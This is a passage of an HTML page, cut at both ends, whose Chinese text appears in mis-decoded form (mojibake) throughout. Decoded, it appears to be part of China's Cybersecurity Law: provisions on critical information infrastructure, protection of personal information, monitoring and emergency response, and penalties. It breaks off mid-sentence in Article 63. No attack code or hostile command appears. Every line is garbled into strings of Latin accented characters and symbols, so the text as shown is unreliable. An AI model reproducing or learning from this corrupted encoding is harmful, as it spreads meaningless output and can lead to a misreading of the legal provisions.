…±å’Œå›½å¢ƒå†…è¿è¥ä¸­æ”¶é›†å’Œäº§ç”Ÿçš„ä¸ªäººä¿¡æ¯å’Œé‡è¦æ•°æ®åº”å½“åœ¨å¢ƒå†…å­˜å‚¨ã€‚å› ä¸šåŠ¡éœ€è¦ï¼Œç¡®éœ€å‘å¢ƒå¤–æä¾›çš„ï¼Œåº”å½“æŒ‰ç…§å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨åˆ¶å®šçš„åŠæ³•è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼›æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¦æœ‰è§„å®šçš„ï¼Œä¾ç…§å…¶è§„å®šã€‚</p><p>ç¬¬ä¸‰åå…«æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…åº”å½“è‡ªè¡Œæˆ–è€…å§”æ‰˜ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„å¯¹å…¶ç½‘ç»œçš„å®‰å…¨æ€§å’Œå¯èƒ½å­˜åœ¨çš„é£é™©æ¯å¹´è‡³å°‘è¿›è¡Œä¸€æ¬¡æ£€æµ‹è¯„ä¼°ï¼Œå¹¶å°†æ£€æµ‹è¯„ä¼°æƒ…å†µå’Œæ”¹è¿›æªæ–½æŠ¥é€ç›¸å…³è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨ã€‚</p><p>ç¬¬ä¸‰åä¹æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨åº”å½“ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨å¯¹å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å®‰å…¨ä¿æŠ¤é‡‡å–ä¸‹åˆ—æªæ–½ï¼š</p><p>ï¼ˆä¸€ï¼‰å¯¹å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å®‰å…¨é£é™©è¿›è¡ŒæŠ½æŸ¥æ£€æµ‹ï¼Œæå‡ºæ”¹è¿›æªæ–½ï¼Œå¿…è¦æ—¶å¯ä»¥å§”æ‰˜ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„å¯¹ç½‘ç»œå­˜åœ¨çš„å®‰å…¨é£é™©è¿›è¡Œæ£€æµ‹è¯„ä¼°ï¼›</p><p>ï¼ˆäºŒï¼‰å®šæœŸç»„ç»‡å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿›è¡Œç½‘ç»œå®‰å…¨åº”æ€¥æ¼”ç»ƒï¼Œæé«˜åº”å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶çš„æ°´å¹³å’ŒååŒé…åˆèƒ½åŠ›ï¼›</p><p>ï¼ˆä¸‰ï¼‰ä¿ƒè¿›æœ‰å…³éƒ¨é—¨ã€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…ä»¥åŠæœ‰å…³ç ”ç©¶æœºæ„ã€ç½‘ç»œå®‰å…¨æœåŠ¡æœºæ„ç­‰ä¹‹é—´çš„ç½‘ç»œå®‰å…¨ä¿¡æ¯å…±äº«ï¼›</p><p>ï¼ˆå››ï¼‰å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶çš„åº”æ€¥å¤„ç½®ä¸ç½‘ç»œåŠŸèƒ½çš„æ¢å¤ç­‰ï¼Œæä¾›æŠ€æœ¯æ”¯æŒå’ŒååŠ©ã€‚</p><h1 id="ç¬¬å››ç« -ç½‘ç»œä¿¡æ¯å®‰å…¨"><a href="#ç¬¬å››ç« -ç½‘ç»œä¿¡æ¯å®‰å…¨" class="headerlink" title="ç¬¬å››ç« ã€€ç½‘ç»œä¿¡æ¯å®‰å…¨"></a>ç¬¬å››ç« ã€€ç½‘ç»œä¿¡æ¯å®‰å…¨</h1><p>ç¬¬å››åæ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“å¯¹å…¶æ”¶é›†çš„ç”¨æˆ·ä¿¡æ¯ä¸¥æ ¼ä¿å¯†ï¼Œå¹¶å»ºç«‹å¥å…¨ç”¨æˆ·ä¿¡æ¯ä¿æŠ¤åˆ¶åº¦ã€‚</p><p>ç¬¬å››åä¸€æ¡ã€€ç½‘ç»œè¿è¥è€…æ”¶é›†ã€ä½¿ç”¨ä¸ªäººä¿¡æ¯ï¼Œåº”å½“éµå¾ªåˆæ³•ã€æ­£å½“ã€å¿…è¦çš„åŸåˆ™ï¼Œå…¬å¼€æ”¶é›†ã€ä½¿ç”¨è§„åˆ™ï¼Œæ˜ç¤ºæ”¶é›†ã€ä½¿ç”¨ä¿¡æ¯çš„ç›®çš„ã€æ–¹å¼å’ŒèŒƒå›´ï¼Œå¹¶ç»è¢«æ”¶é›†è€…åŒæ„ã€‚</p><p>ç½‘ç»œè¿è¥è€…ä¸å¾—æ”¶é›†ä¸å…¶æä¾›çš„æœåŠ¡æ— å…³çš„ä¸ªäººä¿¡æ¯ï¼Œä¸å¾—è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’ŒåŒæ–¹çš„çº¦å®šæ”¶é›†ã€ä½¿ç”¨ä¸ªäººä¿¡æ¯ï¼Œå¹¶åº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’Œä¸ç”¨æˆ·çš„çº¦å®šï¼Œå¤„ç†å…¶ä¿å­˜çš„ä¸ªäººä¿¡æ¯ã€‚</p><p>ç¬¬å››åäºŒæ¡ã€€ç½‘ç»œè¿è¥è€…ä¸å¾—æ³„éœ²ã€ç¯¡æ”¹ã€æ¯æŸå…¶æ”¶é›†çš„ä¸ªäººä¿¡æ¯ï¼›æœªç»è¢«æ”¶é›†è€…åŒæ„ï¼Œä¸å¾—å‘ä»–äººæä¾›ä¸ªäººä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œç»è¿‡å¤„ç†æ— æ³•è¯†åˆ«ç‰¹å®šä¸ªäººä¸”ä¸èƒ½å¤åŸçš„é™¤å¤–ã€‚</p><p>ç½‘ç»œè¿è¥è€…åº”å½“é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œç¡®ä¿å…¶æ”¶é›†çš„ä¸ªäººä¿¡æ¯å®‰å…¨ï¼Œé˜²æ­¢ä¿¡æ¯æ³„éœ²ã€æ¯æŸã€ä¸¢å¤±ã€‚åœ¨å‘ç”Ÿæˆ–è€…å¯èƒ½å‘ç”Ÿä¸ªäººä¿¡æ¯æ³„éœ²ã€æ¯æŸã€ä¸¢å¤±çš„æƒ…å†µæ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ç¬¬å››åä¸‰æ¡ã€€ä¸ªäººå‘ç°ç½‘ç»œè¿è¥è€…è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šæˆ–è€…åŒæ–¹çš„çº¦å®šæ”¶é›†ã€ä½¿ç”¨å…¶ä¸ªäººä¿¡æ¯çš„ï¼Œæœ‰æƒè¦æ±‚ç½‘ç»œè¿è¥è€…åˆ é™¤å…¶ä¸ªäººä¿¡æ¯ï¼›å‘ç°ç½‘ç»œè¿è¥è€…æ”¶é›†ã€å­˜å‚¨çš„å…¶ä¸ªäººä¿¡æ¯æœ‰é”™è¯¯çš„ï¼Œæœ‰æƒè¦æ±‚ç½‘ç»œè¿è¥è€…äºˆä»¥æ›´æ­£ã€‚ç½‘ç»œè¿è¥è€…åº”å½“é‡‡å–æªæ–½äºˆä»¥åˆ é™¤æˆ–è€…æ›´æ­£ã€‚</p><p>ç¬¬å››åå››æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—çªƒå–æˆ–è€…ä»¥å…¶ä»–éæ³•æ–¹å¼è·å–ä¸ªäººä¿¡æ¯ï¼Œä¸å¾—éæ³•å‡ºå”®æˆ–è€…éæ³•å‘ä»–äººæä¾›ä¸ªäººä¿¡æ¯ã€‚</p><p>ç¬¬å››åäº”æ¡ã€€ä¾æ³•è´Ÿæœ‰ç½‘ç»œå®‰å…¨ç›‘ç£ç®¡ç†èŒè´£çš„éƒ¨é—¨åŠå…¶å·¥ä½œäººå‘˜ï¼Œå¿…é¡»å¯¹åœ¨å±¥è¡ŒèŒè´£ä¸­çŸ¥æ‚‰çš„ä¸ªäººä¿¡æ¯ã€éšç§å’Œå•†ä¸šç§˜å¯†ä¸¥æ ¼ä¿å¯†ï¼Œä¸å¾—æ³„éœ²ã€å‡ºå”®æˆ–è€…éæ³•å‘ä»–äººæä¾›ã€‚</p><p>ç¬¬å››åå…­æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡åº”å½“å¯¹å…¶ä½¿ç”¨ç½‘ç»œçš„è¡Œä¸ºè´Ÿè´£ï¼Œä¸å¾—è®¾ç«‹ç”¨äºå®æ–½è¯ˆéª—ï¼Œä¼ æˆçŠ¯ç½ªæ–¹æ³•ï¼Œåˆ¶ä½œæˆ–è€…é”€å”®è¿ç¦ç‰©å“ã€ç®¡åˆ¶ç‰©å“ç­‰è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ç½‘ç«™ã€é€šè®¯ç¾¤ç»„ï¼Œä¸å¾—åˆ©ç”¨ç½‘ç»œå‘å¸ƒæ¶‰åŠå®æ–½è¯ˆéª—ï¼Œåˆ¶ä½œæˆ–è€…é”€å”®è¿ç¦ç‰©å“ã€ç®¡åˆ¶ç‰©å“ä»¥åŠå…¶ä»–è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ä¿¡æ¯ã€‚</p><p>ç¬¬å››åä¸ƒæ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“åŠ å¼ºå¯¹å…¶ç”¨æˆ·å‘å¸ƒçš„ä¿¡æ¯çš„ç®¡ç†ï¼Œå‘ç°æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯çš„ï¼Œåº”å½“ç«‹å³åœæ­¢ä¼ è¾“è¯¥ä¿¡æ¯ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œé˜²æ­¢ä¿¡æ¯æ‰©æ•£ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼Œå¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ç¬¬å››åå…«æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡å‘é€çš„ç”µå­ä¿¡æ¯ã€æä¾›çš„åº”ç”¨è½¯ä»¶ï¼Œä¸å¾—è®¾ç½®æ¶æ„ç¨‹åºï¼Œä¸å¾—å«æœ‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯ã€‚</p><p>ç”µå­ä¿¡æ¯å‘é€æœåŠ¡æä¾›è€…å’Œåº”ç”¨è½¯ä»¶ä¸‹è½½æœåŠ¡æä¾›è€…ï¼Œåº”å½“å±¥è¡Œå®‰å…¨ç®¡ç†ä¹‰åŠ¡ï¼ŒçŸ¥é“å…¶ç”¨æˆ·æœ‰å‰æ¬¾è§„å®šè¡Œä¸ºçš„ï¼Œåº”å½“åœæ­¢æä¾›æœåŠ¡ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼Œå¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ç¬¬å››åä¹æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“å»ºç«‹ç½‘ç»œä¿¡æ¯å®‰å…¨æŠ•è¯‰ã€ä¸¾æŠ¥åˆ¶åº¦ï¼Œå…¬å¸ƒæŠ•è¯‰ã€ä¸¾æŠ¥æ–¹å¼ç­‰ä¿¡æ¯ï¼ŒåŠæ—¶å—ç†å¹¶å¤„ç†æœ‰å…³ç½‘ç»œä¿¡æ¯å®‰å…¨çš„æŠ•è¯‰å’Œä¸¾æŠ¥ã€‚</p><p>ç½‘ç»œè¿è¥è€…å¯¹ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨ä¾æ³•å®æ–½çš„ç›‘ç£æ£€æŸ¥ï¼Œåº”å½“äºˆä»¥é…åˆã€‚</p><p>ç¬¬äº”åæ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨ä¾æ³•å±¥è¡Œç½‘ç»œä¿¡æ¯å®‰å…¨ç›‘ç£ç®¡ç†èŒè´£ï¼Œå‘ç°æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯çš„ï¼Œåº”å½“è¦æ±‚ç½‘ç»œè¿è¥è€…åœæ­¢ä¼ è¾“ï¼Œé‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ï¼Œä¿å­˜æœ‰å…³è®°å½•ï¼›å¯¹æ¥æºäºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–çš„ä¸Šè¿°ä¿¡æ¯ï¼Œåº”å½“é€šçŸ¥æœ‰å…³æœºæ„é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½é˜»æ–­ä¼ æ’­ã€‚</p><h1 id="ç¬¬äº”ç« -ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®"><a href="#ç¬¬äº”ç« -ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®" class="headerlink" title="ç¬¬äº”ç« ã€€ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®"></a>ç¬¬äº”ç« ã€€ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®</h1><p>ç¬¬äº”åä¸€æ¡ã€€å›½å®¶å»ºç«‹ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦å’Œä¿¡æ¯é€šæŠ¥åˆ¶åº¦ã€‚å›½å®¶ç½‘ä¿¡éƒ¨é—¨åº”å½“ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨åŠ å¼ºç½‘ç»œå®‰å…¨ä¿¡æ¯æ”¶é›†ã€åˆ†æå’Œé€šæŠ¥å·¥ä½œï¼ŒæŒ‰ç…§è§„å®šç»Ÿä¸€å‘å¸ƒç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦ä¿¡æ¯ã€‚</p><p>ç¬¬äº”åäºŒæ¡ã€€è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨ï¼Œåº”å½“å»ºç«‹å¥å…¨æœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦å’Œä¿¡æ¯é€šæŠ¥åˆ¶åº¦ï¼Œå¹¶æŒ‰ç…§è§„å®šæŠ¥é€ç½‘ç»œå®‰å…¨ç›‘æµ‹é¢„è­¦ä¿¡æ¯ã€‚</p><p>ç¬¬äº”åä¸‰æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨åè°ƒæœ‰å…³éƒ¨é—¨å»ºç«‹å¥å…¨ç½‘ç»œå®‰å…¨é£é™©è¯„ä¼°å’Œåº”æ€¥å·¥ä½œæœºåˆ¶ï¼Œåˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸç»„ç»‡æ¼”ç»ƒã€‚</p><p>è´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨åº”å½“åˆ¶å®šæœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸç»„ç»‡æ¼”ç»ƒã€‚</p><p>ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆåº”å½“æŒ‰ç…§äº‹ä»¶å‘ç”Ÿåçš„å±å®³ç¨‹åº¦ã€å½±å“èŒƒå›´ç­‰å› ç´ å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶è¿›è¡Œåˆ†çº§ï¼Œå¹¶è§„å®šç›¸åº”çš„åº”æ€¥å¤„ç½®æªæ–½ã€‚</p><p>ç¬¬äº”åå››æ¡ã€€ç½‘ç»œå®‰å…¨äº‹ä»¶å‘ç”Ÿçš„é£é™©å¢å¤§æ—¶ï¼Œçœçº§ä»¥ä¸Šäººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨åº”å½“æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºï¼Œå¹¶æ ¹æ®ç½‘ç»œå®‰å…¨é£é™©çš„ç‰¹ç‚¹å’Œå¯èƒ½é€ æˆçš„å±å®³ï¼Œé‡‡å–ä¸‹åˆ—æªæ–½ï¼š</p><p>ï¼ˆä¸€ï¼‰è¦æ±‚æœ‰å…³éƒ¨é—¨ã€æœºæ„å’Œäººå‘˜åŠæ—¶æ”¶é›†ã€æŠ¥å‘Šæœ‰å…³ä¿¡æ¯ï¼ŒåŠ å¼ºå¯¹ç½‘ç»œå®‰å…¨é£é™©çš„ç›‘æµ‹ï¼›</p><p>ï¼ˆäºŒï¼‰ç»„ç»‡æœ‰å…³éƒ¨é—¨ã€æœºæ„å’Œä¸“ä¸šäººå‘˜ï¼Œå¯¹ç½‘ç»œå®‰å…¨é£é™©ä¿¡æ¯è¿›è¡Œåˆ†æè¯„ä¼°ï¼Œé¢„æµ‹äº‹ä»¶å‘ç”Ÿçš„å¯èƒ½æ€§ã€å½±å“èŒƒå›´å’Œå±å®³ç¨‹åº¦ï¼›</p><p>ï¼ˆä¸‰ï¼‰å‘ç¤¾ä¼šå‘å¸ƒç½‘ç»œå®‰å…¨é£é™©é¢„è­¦ï¼Œå‘å¸ƒé¿å…ã€å‡è½»å±å®³çš„æªæ–½ã€‚</p><p>ç¬¬äº”åäº”æ¡ã€€å‘ç”Ÿç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œåº”å½“ç«‹å³å¯åŠ¨ç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶è¿›è¡Œè°ƒæŸ¥å’Œè¯„ä¼°ï¼Œè¦æ±‚ç½‘ç»œè¿è¥è€…é‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œæ¶ˆé™¤å®‰å…¨éšæ‚£ï¼Œé˜²æ­¢å±å®³æ‰©å¤§ï¼Œå¹¶åŠæ—¶å‘ç¤¾ä¼šå‘å¸ƒä¸å…¬ä¼—æœ‰å…³çš„è­¦ç¤ºä¿¡æ¯ã€‚</p><p>ç¬¬äº”åå…­æ¡ã€€çœçº§ä»¥ä¸Šäººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨åœ¨å±¥è¡Œç½‘ç»œå®‰å…¨ç›‘ç£ç®¡ç†èŒè´£ä¸­ï¼Œå‘ç°ç½‘ç»œå­˜åœ¨è¾ƒå¤§å®‰å…¨é£é™©æˆ–è€…å‘ç”Ÿå®‰å…¨äº‹ä»¶çš„ï¼Œå¯ä»¥æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºå¯¹è¯¥ç½‘ç»œçš„è¿è¥è€…çš„æ³•å®šä»£è¡¨äººæˆ–è€…ä¸»è¦è´Ÿè´£äººè¿›è¡Œçº¦è°ˆã€‚ç½‘ç»œè¿è¥è€…åº”å½“æŒ‰ç…§è¦æ±‚é‡‡å–æªæ–½ï¼Œè¿›è¡Œæ•´æ”¹ï¼Œæ¶ˆé™¤éšæ‚£ã€‚</p><p>ç¬¬äº”åä¸ƒæ¡ã€€å› ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œå‘ç”Ÿçªå‘äº‹ä»¶æˆ–è€…ç”Ÿäº§å®‰å…¨äº‹æ•…çš„ï¼Œåº”å½“ä¾ç…§ã€Šä¸­åäººæ°‘å…±å’Œå›½çªå‘äº‹ä»¶åº”å¯¹æ³•ã€‹ã€ã€Šä¸­åäººæ°‘å…±å’Œå›½å®‰å…¨ç”Ÿäº§æ³•ã€‹ç­‰æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå¤„ç½®ã€‚</p><p>ç¬¬äº”åå…«æ¡ã€€å› ç»´æŠ¤å›½å®¶å®‰å…¨å’Œç¤¾ä¼šå…¬å…±ç§©åºï¼Œå¤„ç½®é‡å¤§çªå‘ç¤¾ä¼šå®‰å…¨äº‹ä»¶çš„éœ€è¦ï¼Œç»å›½åŠ¡é™¢å†³å®šæˆ–è€…æ‰¹å‡†ï¼Œå¯ä»¥åœ¨ç‰¹å®šåŒºåŸŸå¯¹ç½‘ç»œé€šä¿¡é‡‡å–é™åˆ¶ç­‰ä¸´æ—¶æªæ–½ã€‚</p><h1 id="ç¬¬å…­ç« -æ³•å¾‹è´£ä»»"><a href="#ç¬¬å…­ç« -æ³•å¾‹è´£ä»»" class="headerlink" title="ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»"></a>ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»</h1><p>ç¬¬äº”åä¹æ¡ã€€ç½‘ç»œè¿è¥è€…ä¸å±¥è¡Œæœ¬æ³•ç¬¬äºŒåä¸€æ¡ã€ç¬¬äºŒåäº”æ¡è§„å®šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„äº”åƒå…ƒä»¥ä¸Šäº”ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…ä¸å±¥è¡Œæœ¬æ³•ç¬¬ä¸‰åä¸‰æ¡ã€ç¬¬ä¸‰åå››æ¡ã€ç¬¬ä¸‰åå…­æ¡ã€ç¬¬ä¸‰åå…«æ¡è§„å®šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ç¬¬å…­åæ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåäºŒæ¡ç¬¬ä¸€æ¬¾ã€ç¬¬äºŒæ¬¾å’Œç¬¬å››åå…«æ¡ç¬¬ä¸€æ¬¾è§„å®šï¼Œæœ‰ä¸‹åˆ—è¡Œä¸ºä¹‹ä¸€çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…å¯¼è‡´å±å®³ç½‘ç»œå®‰å…¨ç­‰åæœçš„ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼š</p><p>ï¼ˆä¸€ï¼‰è®¾ç½®æ¶æ„ç¨‹åºçš„ï¼›</p><p>ï¼ˆäºŒï¼‰å¯¹å…¶äº§å“ã€æœåŠ¡å­˜åœ¨çš„å®‰å…¨ç¼ºé™·ã€æ¼æ´ç­‰é£é™©æœªç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼Œæˆ–è€…æœªæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šçš„ï¼›</p><p>ï¼ˆä¸‰ï¼‰æ“…è‡ªç»ˆæ­¢ä¸ºå…¶äº§å“ã€æœåŠ¡æä¾›å®‰å…¨ç»´æŠ¤çš„ã€‚</p><p>ç¬¬å…­åä¸€æ¡ã€€ç½‘ç»œè¿è¥è€…è¿åæœ¬æ³•ç¬¬äºŒåå››æ¡ç¬¬ä¸€æ¬¾è§„å®šï¼Œæœªè¦æ±‚ç”¨æˆ·æä¾›çœŸå®èº«ä»½ä¿¡æ¯ï¼Œæˆ–è€…å¯¹ä¸æä¾›çœŸå®èº«ä»½ä¿¡æ¯çš„ç”¨æˆ·æä¾›ç›¸å…³æœåŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥ç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ç¬¬å…­åäºŒæ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåå…­æ¡è§„å®šï¼Œå¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹ã€é£é™©è¯„ä¼°ç­‰æ´»åŠ¨ï¼Œæˆ–è€…å‘ç¤¾ä¼šå‘å¸ƒç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰ç½‘ç»œå®‰å…¨ä¿¡æ¯çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥ç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„äº”åƒå…ƒä»¥ä¸Šäº”ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ç¬¬å…­åä¸‰æ¡ã€€è¿åæœ¬æ³•ç¬¬äºŒåä¸ƒæ¡è§„å®šï¼Œä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨ï¼Œæˆ–è€…æä¾›ä¸“é—¨ç”¨äºä»äº‹å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºã€å·¥å…·ï¼Œæˆ–è€…ä¸ºä»–äººä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨æä¾›æŠ€æœ¯æ”¯æŒã€å¹¿å‘Šæ¨å¹¿ã€æ”¯ä»˜ç»“ç®—ç­‰å¸®åŠ©ï¼Œå°šä¸æ„